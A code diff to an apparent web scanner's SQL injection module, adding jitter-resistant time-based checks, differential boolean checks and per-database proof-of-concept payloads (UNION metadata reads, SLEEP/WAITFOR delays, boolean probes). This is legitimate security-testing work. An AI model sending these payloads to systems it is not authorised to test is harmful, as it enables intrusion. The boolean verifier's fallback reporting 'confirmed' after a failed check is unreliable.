@@ -17,6 +17,7 @@ with enhanced 6-step injection testing methodology.
 import re
 import time
 import hashlib
+import statistics
 from typing import List, Dict, Any, Tuple, Optional, Set, Callable
 from dataclasses import dataclass, field
 from collections import defaultdict
@@ -503,7 +504,65 @@ class EnhancedDBMSFingerprinter:
         return payloads
 
 
+def compute_response_delta(
+    baseline_body: str,
+    injected_body: str,
+    baseline_status: int = 200,
+    injected_status: int = 200,
+    baseline_headers: Optional[Dict[str, str]] = None,
+    injected_headers: Optional[Dict[str, str]] = None,
+) -> float:
+    """Compute a differential delta score between a baseline and an injected response.
 
+    Uses normalised body fingerprint equality, content length difference,
+    status code difference, and optional key header differences to produce a
+    score in ``[0.0, 1.0]`` where higher values indicate a more meaningful
+    difference.
+
+    Parameters
+    ----------
+    baseline_body:    Raw response body of the benign baseline request.
+    injected_body:    Raw response body of the injected request.
+    baseline_status:  HTTP status code of the baseline response (default 200).
+    injected_status:  HTTP status code of the injected response (default 200).
+    baseline_headers: Optional headers dict for the baseline response.
+    injected_headers: Optional headers dict for the injected response.
+
+    Returns
+    -------
+    float
+        Delta score in ``[0.0, 1.0]``.  ``0.0`` means the responses are
+        indistinguishable; ``1.0`` means maximally different.
+    """
+    from ..engine.normalization import fingerprint as _fingerprint
+
+    delta = 0.0
+
+    # 1. Normalised body fingerprint inequality (weight 0.50)
+    if _fingerprint(baseline_body) != _fingerprint(injected_body):
+        delta += 0.50
+
+    # 2. Content length difference (weight up to 0.25)
+    baseline_len = len(baseline_body)
+    injected_len = len(injected_body)
+    if baseline_len > 0 or injected_len > 0:
+        len_diff_ratio = abs(baseline_len - injected_len) / max(1, max(baseline_len, injected_len))
+        delta += min(0.25, len_diff_ratio * 1.0)  # ≥25% length diff → full 0.25 weight
+
+    # 3. Status code difference (weight 0.15)
+    if baseline_status != injected_status:
+        delta += 0.15
+
+    # 4. Key header differences (weight 0.025 each, up to 0.10)
+    _INTERESTING_HEADERS = {"content-type", "x-powered-by", "server", "location"}
+    if baseline_headers and injected_headers:
+        for hdr in _INTERESTING_HEADERS:
+            b_val = (baseline_headers or {}).get(hdr, "").lower()
+            i_val = (injected_headers or {}).get(hdr, "").lower()
+            if b_val != i_val:
+                delta += 0.025
+
+    return round(min(1.0, delta), 4)
 
 
 class SQLInjectionModule(InjectionAttackModule):
@@ -1361,54 +1420,96 @@ class SQLInjectionModule(InjectionAttackModule):
         headers: Optional[Dict[str, str]],
         cookies: Optional[Dict[str, str]]
     ) -> Tuple[bool, float, str]:
-        """Verify time-based SQL injection."""
+        """Verify time-based SQL injection with guardrails against jitter.
+
+        Uses multiple baseline samples (median + IQR) and requires repeated
+        delayed responses *plus* a benign control that does NOT meet the
+        delay threshold before confirming.
+        """
         import requests
-        
-        # Test with different delays
-        delay_tests = [
-            (3, successful_payload.replace('5', '3')),
-            (7, successful_payload.replace('5', '7')),
-        ]
-        
-        verified_count = 0
-        
-        for expected_delay, test_payload in delay_tests:
+        from ..engine.timeguard import _SLEEP_PAYLOADS, build_sleep_payload
+        from ..engine.baseline import _median, _iqr
+
+        timeout = self.config.get('timeout', 20)
+
+        def _do_request(payload_value: str) -> Optional[float]:
+            """Send one request and return elapsed seconds, or None on error."""
             try:
-                injected_value = self._inject_payload(parameter_value, test_payload)
-                start_time = time.time()
-                
+                injected_value = self._inject_payload(parameter_value, payload_value)
+                t0 = time.time()
                 if parameter_type.upper() == "GET":
-                    response = requests.get(
+                    requests.get(
                         target_url,
                         params={parameter_name: injected_value},
-                        headers=headers,
-                        cookies=cookies,
-                        timeout=self.config.get('timeout', 15)
+                        headers=headers, cookies=cookies, timeout=timeout,
                     )
                 elif parameter_type.upper() == "POST":
-                    response = requests.post(
+                    requests.post(
                         target_url,
                         data={parameter_name: injected_value},
-                        headers=headers,
-                        cookies=cookies,
-                        timeout=self.config.get('timeout', 15)
+                        headers=headers, cookies=cookies, timeout=timeout,
                     )
                 else:
-                    continue
-                
-                response_time = time.time() - start_time
-                
-                # Check if response time matches expected delay
-                if response_time >= expected_delay - 1:
-                    verified_count += 1
-                    
+                    return None
+                return time.time() - t0
             except Exception:
-                continue
-        
+                return None
+
+        # 1. Collect multiple baseline samples for median + IQR
+        baseline_times: List[float] = []
+        for _ in range(3):
+            t = _do_request(parameter_value)
+            if t is not None:
+                baseline_times.append(t)
+        if not baseline_times:
+            return False, 0.60, "Time-based verification: could not establish baseline"
+        baseline_median = _median(baseline_times)
+        baseline_iqr = _iqr(baseline_times)
+        # Adaptive threshold: median + max(2*IQR, 2.0) seconds
+        # Adaptive threshold: median + max(2×IQR, 2.0s).
+        # 2.0s minimum avoids false positives on fast networks where IQR ≈ 0;
+        # the 2×IQR factor covers ~95% of natural variance so only genuine
+        # sleep-induced delays exceed the threshold.
+        threshold = baseline_median + max(2.0 * baseline_iqr, 2.0)
+
+        # 2. Build delay payloads using build_sleep_payload (safe substitution)
+        delay_seconds = 3
+        # Determine the template from the successful payload or pick from library
+        matching_templates = [
+            t for t in _SLEEP_PAYLOADS
+            if any(kw in t.upper() for kw in ("SLEEP", "PG_SLEEP", "WAITFOR"))
+        ]
+        templates_to_try = matching_templates[:2] if matching_templates else _SLEEP_PAYLOADS[:2]
+
+        verified_count = 0
+        for template in templates_to_try:
+            test_payload = build_sleep_payload(template, delay_seconds)
+            t = _do_request(test_payload)
+            if t is not None and t >= threshold:
+                verified_count += 1
+
+        # 3. Benign control: original parameter value must NOT meet threshold
+        benign_times = [_do_request(parameter_value) for _ in range(2)]
+        benign_times = [t for t in benign_times if t is not None]
+        benign_triggered = any(t >= threshold for t in benign_times) if benign_times else False
+
+        if benign_triggered:
+            return (
+                False,
+                0.50,
+                "Time-based verification: benign control also exceeded threshold "
+                f"(baseline_median={baseline_median:.2f}s, threshold={threshold:.2f}s) "
+                "— likely network jitter, not SQLi",
+            )
+
         confirmed = verified_count >= 1
-        confidence = 0.90 if verified_count == 2 else 0.80 if verified_count == 1 else 0.60
-        evidence = f"Time-based SQL injection verified with {verified_count}/2 delay tests"
-        
+        confidence = 0.90 if verified_count >= 2 else 0.80 if verified_count == 1 else 0.60
+        evidence = (
+            f"Time-based SQL injection verified: {verified_count}/{len(templates_to_try)} "
+            f"delay probes exceeded threshold={threshold:.2f}s "
+            f"(baseline_median={baseline_median:.2f}s, IQR={baseline_iqr:.2f}s); "
+            "benign control negative"
+        )
         return confirmed, confidence, evidence
     
     def _verify_boolean_based(
@@ -1422,63 +1523,72 @@ class SQLInjectionModule(InjectionAttackModule):
         headers: Optional[Dict[str, str]],
         cookies: Optional[Dict[str, str]]
     ) -> Tuple[bool, float, str]:
-        """Verify boolean-based SQL injection."""
+        """Verify boolean-based SQL injection using differential (A/B) analysis.
+
+        Sends paired true/false boolean probes and requires a meaningful
+        ``compute_response_delta`` score before confirming.
+        """
         import requests
-        
-        # Test true and false conditions
+
+        # Paired boolean probes: true condition returns data, false condition returns none
         true_payload = "' AND '1'='1"
         false_payload = "' AND '1'='2"
-        
+
         try:
-            # Test true condition
-            true_injected = self._inject_payload(parameter_value, true_payload)
-            if parameter_type.upper() == "GET":
-                true_response = requests.get(
-                    target_url,
-                    params={parameter_name: true_injected},
-                    headers=headers,
-                    cookies=cookies,
-                    timeout=self.config.get('timeout', 10)
+            def _fetch(probe: str) -> Optional[requests.Response]:
+                injected = self._inject_payload(parameter_value, probe)
+                try:
+                    if parameter_type.upper() == "GET":
+                        return requests.get(
+                            target_url,
+                            params={parameter_name: injected},
+                            headers=headers, cookies=cookies,
+                            timeout=self.config.get('timeout', 10),
+                        )
+                    else:
+                        return requests.post(
+                            target_url,
+                            data={parameter_name: injected},
+                            headers=headers, cookies=cookies,
+                            timeout=self.config.get('timeout', 10),
+                        )
+                except Exception:
+                    return None
+
+            true_resp = _fetch(true_payload)
+            false_resp = _fetch(false_payload)
+
+            if true_resp is None or false_resp is None:
+                return True, 0.70, "Error-based SQL injection confirmed (verification incomplete)"
+
+            true_headers = dict(true_resp.headers)
+            false_headers = dict(false_resp.headers)
+
+            # Compute differential delta between true and false responses
+            delta = compute_response_delta(
+                baseline_body=false_resp.text,
+                injected_body=true_resp.text,
+                baseline_status=false_resp.status_code,
+                injected_status=true_resp.status_code,
+                baseline_headers=false_headers,
+                injected_headers=true_headers,
+            )
+
+            # Require a meaningful delta to confirm boolean-based SQLi
+            if delta >= 0.30:
+                true_len = len(true_resp.text)
+                false_len = len(false_resp.text)
+                return (
+                    True,
+                    0.85,
+                    f"Boolean-based SQLi confirmed: differential delta={delta:.3f} "
+                    f"(true:{true_len} vs false:{false_len} bytes, "
+                    f"status {true_resp.status_code} vs {false_resp.status_code})",
                 )
-            else:
-                true_response = requests.post(
-                    target_url,
-                    data={parameter_name: true_injected},
-                    headers=headers,
-                    cookies=cookies,
-                    timeout=self.config.get('timeout', 10)
-                )
-            
-            # Test false condition
-            false_injected = self._inject_payload(parameter_value, false_payload)
-            if parameter_type.upper() == "GET":
-                false_response = requests.get(
-                    target_url,
-                    params={parameter_name: false_injected},
-                    headers=headers,
-                    cookies=cookies,
-                    timeout=self.config.get('timeout', 10)
-                )
-            else:
-                false_response = requests.post(
-                    target_url,
-                    data={parameter_name: false_injected},
-                    headers=headers,
-                    cookies=cookies,
-                    timeout=self.config.get('timeout', 10)
-                )
-            
-            # Compare responses
-            true_len = len(true_response.text)
-            false_len = len(false_response.text)
-            
-            # Significant difference indicates boolean-based SQLi
-            if abs(true_len - false_len) > 100:
-                return True, 0.85, f"Boolean-based SQLi confirmed (true:{true_len} vs false:{false_len} bytes)"
-            
+
         except Exception:
             pass
-        
+
         return True, 0.70, "Error-based SQL injection confirmed (verification incomplete)"
     
     def step5_build_poc(
@@ -1488,41 +1598,153 @@ class SQLInjectionModule(InjectionAttackModule):
         evidence: Dict[str, Any]
     ) -> Dict[str, Any]:
         """
-        Step 5: Build proof-of-concept payloads for safe, verifiable exploits.
-        
-        Create a safe POC that demonstrates the SQL injection.
+        Step 5: Build DBMS-aware, safe proof-of-concept payloads.
+
+        Returns a structured dict with:
+        - ``poc_type``          primary injection type detected
+        - ``poc_payload``       primary PoC payload (union/error-based)
+        - ``expected_result``   marker string expected in the response
+        - ``safety_notes``      explanation of why this PoC is safe
+        - ``reproduction_steps`` ordered list of steps to reproduce
+        - ``variants``          list of variant PoC dicts (boolean, time-based)
+        - ``original_payload``  the payload that originally triggered detection
+        - ``database_type``     detected DBMS or "Unknown"
         """
         db_type = evidence.get('context_info', {}).get('database_type', 'Unknown')
-        
-        # Select POC based on database type
-        if db_type == 'MySQL':
-            poc_payload = "' UNION SELECT 'POC', @@version, user()--"
-            expected = "POC string and MySQL version information"
-        elif db_type == 'PostgreSQL':
-            poc_payload = "' UNION SELECT 'POC', version(), current_user--"
-            expected = "POC string and PostgreSQL version information"
-        elif db_type == 'MSSQL':
-            poc_payload = "' UNION SELECT 'POC', @@version, SYSTEM_USER--"
-            expected = "POC string and MSSQL version information"
-        elif db_type == 'Oracle':
-            poc_payload = "' UNION SELECT 'POC', banner FROM v$version--"
-            expected = "POC string and Oracle version information"
+
+        # DBMS-specific union/error-based PoC (safe metadata reads only)
+        _DBMS_UNION_POC: Dict[str, Tuple[str, str]] = {
+            'MySQL': (
+                "' UNION SELECT 'POC_MARKER',@@version,user()-- -",
+                "POC_MARKER followed by MySQL version and current user",
+            ),
+            'PostgreSQL': (
+                "' UNION SELECT 'POC_MARKER',version(),current_user-- -",
+                "POC_MARKER followed by PostgreSQL version and current user",
+            ),
+            'MSSQL': (
+                "' UNION SELECT 'POC_MARKER',@@version,SYSTEM_USER-- -",
+                "POC_MARKER followed by MSSQL version and system user",
+            ),
+            'Oracle': (
+                # ROWNUM=1 limits the v$version view (which may have multiple rows) to one row,
+                # avoiding large result sets; other DBMS PoCs return single-row results by design.
+                "' UNION SELECT 'POC_MARKER',banner,user FROM v$version WHERE ROWNUM=1-- -",
+                "POC_MARKER followed by Oracle banner and current user",
+            ),
+            'SQLite': (
+                "' UNION SELECT 'POC_MARKER',sqlite_version(),'sqlite'-- -",
+                "POC_MARKER followed by SQLite version string",
+            ),
+        }
+
+        # DBMS-specific boolean-based PoC pairs
+        _DBMS_BOOL_POC: Dict[str, Tuple[str, str, str]] = {
+            'MySQL':      ("' AND 1=1-- -", "' AND 1=2-- -", "MySQL boolean differential"),
+            'PostgreSQL': ("' AND 1=1-- -", "' AND 1=2-- -", "PostgreSQL boolean differential"),
+            'MSSQL':      ("' AND 1=1-- -", "' AND 1=2-- -", "MSSQL boolean differential"),
+            'Oracle':     ("' AND 1=1-- -", "' AND 1=2-- -", "Oracle boolean differential"),
+            'SQLite':     ("' AND 1=1-- -", "' AND 1=2-- -", "SQLite boolean differential"),
+        }
+
+        # DBMS-specific time-based PoC (low-impact delay + benign control)
+        _DBMS_TIME_POC: Dict[str, Tuple[str, str, str]] = {
+            'MySQL':      ("' AND SLEEP(2)-- -",                 "' AND SLEEP(0)-- -", "MySQL SLEEP(2)"),
+            'PostgreSQL': ("' AND 1=(SELECT 1 FROM pg_sleep(2))-- -",
+                           "' AND 1=(SELECT 1 FROM pg_sleep(0))-- -", "PostgreSQL pg_sleep(2)"),
+            'MSSQL':      ("'; WAITFOR DELAY '0:0:2'-- -",       "'; WAITFOR DELAY '0:0:0'-- -", "MSSQL WAITFOR DELAY 2s"),
+            'Oracle':     ("' AND 1=DBMS_LOCK.SLEEP(2)-- -",     "' AND 1=0-- -", "Oracle DBMS_LOCK.SLEEP(2)"),
+            'SQLite':     ("' AND 1=1-- -",                       "' AND 1=2-- -", "SQLite (no built-in sleep; boolean fallback)"),
+        }
+
+        poc_payload, expected = _DBMS_UNION_POC.get(
+            db_type,
+            ("' UNION SELECT 'POC_MARKER','CONFIRMED','INJECTION'-- -", "POC_MARKER string in response"),
+        )
+
+        # Determine primary poc_type from evidence anomalies
+        anomaly_hints = evidence.get('details', {}).get('anomalies', [])
+        if any('time_based' in str(a) for a in anomaly_hints):
+            poc_type = 'time_based'
+        elif any('boolean' in str(a) for a in anomaly_hints):
+            poc_type = 'boolean'
+        elif any('union' in str(a).lower() for a in anomaly_hints):
+            poc_type = 'union'
         else:
-            # Generic POC
-            poc_payload = "' UNION SELECT 'POC', 'CONFIRMED', 'INJECTION'--"
-            expected = "POC strings in response"
-        
+            poc_type = 'error_based'
+
+        # Build variants list
+        variants: List[Dict[str, Any]] = []
+
+        # Boolean variant
+        bool_true, bool_false, bool_desc = _DBMS_BOOL_POC.get(
+            db_type, ("' AND 1=1-- -", "' AND 1=2-- -", "boolean differential")
+        )
+        variants.append({
+            'poc_type': 'boolean',
+            'description': bool_desc,
+            'true_payload': bool_true,
+            'false_payload': bool_false,
+            'expected_result': (
+                "Response for true_payload differs meaningfully from false_payload "
+                "(different content length or body)"
+            ),
+            'reproduction_steps': [
+                f"1. Send '{vulnerable_parameter}' = {bool_true}  → note response A",
+                f"2. Send '{vulnerable_parameter}' = {bool_false} → note response B",
+                "3. Confirmed if response A and B differ significantly (length, content)",
+            ],
+        })
+
+        # Time-based variant
+        time_payload, time_control, time_desc = _DBMS_TIME_POC.get(
+            db_type, ("' AND SLEEP(2)-- -", "' AND SLEEP(0)-- -", "generic SLEEP(2)")
+        )
+        variants.append({
+            'poc_type': 'time_based',
+            'description': time_desc,
+            'delay_payload': time_payload,
+            'control_payload': time_control,
+            'expected_delay_seconds': 2,
+            'expected_result': (
+                "Response with delay_payload takes ≥2 s longer than control_payload"
+            ),
+            'reproduction_steps': [
+                f"1. Send '{vulnerable_parameter}' = {time_payload}  → record elapsed time T1",
+                f"2. Send '{vulnerable_parameter}' = {time_control} → record elapsed time T2",
+                "3. Confirmed if T1 >= T2 + 2 seconds and T2 matches normal baseline",
+            ],
+        })
+
+        # Union/error variant (primary)
+        variants.append({
+            'poc_type': 'union' if 'UNION' in poc_payload.upper() else 'error_based',
+            'description': f"{db_type} union-based metadata read",
+            'payload': poc_payload,
+            'expected_result': expected,
+            'reproduction_steps': [
+                f"1. Send '{vulnerable_parameter}' = {poc_payload}",
+                f"2. Observe response for: {expected}",
+                "3. Confirmed if POC_MARKER and database metadata appear in response",
+            ],
+        })
+
         return {
+            'poc_type': poc_type,
             'poc_payload': poc_payload,
             'expected_result': expected,
-            'safety_notes': 'This POC only reads database metadata and does not modify data',
+            'safety_notes': (
+                'All PoC payloads perform metadata reads only (version, user). '
+                'No data is written, deleted, or modified.'
+            ),
             'reproduction_steps': [
-                f"1. Send request with parameter '{vulnerable_parameter}' containing: {poc_payload}",
+                f"1. Send request with parameter '{vulnerable_parameter}' = {poc_payload}",
                 f"2. Observe response for: {expected}",
-                "3. Vulnerability is confirmed if expected data appears in response"
+                "3. Vulnerability is confirmed if POC_MARKER appears in the response body",
             ],
+            'variants': variants,
             'original_payload': successful_payload,
-            'database_type': db_type
+            'database_type': db_type,
         }
     
     def step6_automated_exploitation(
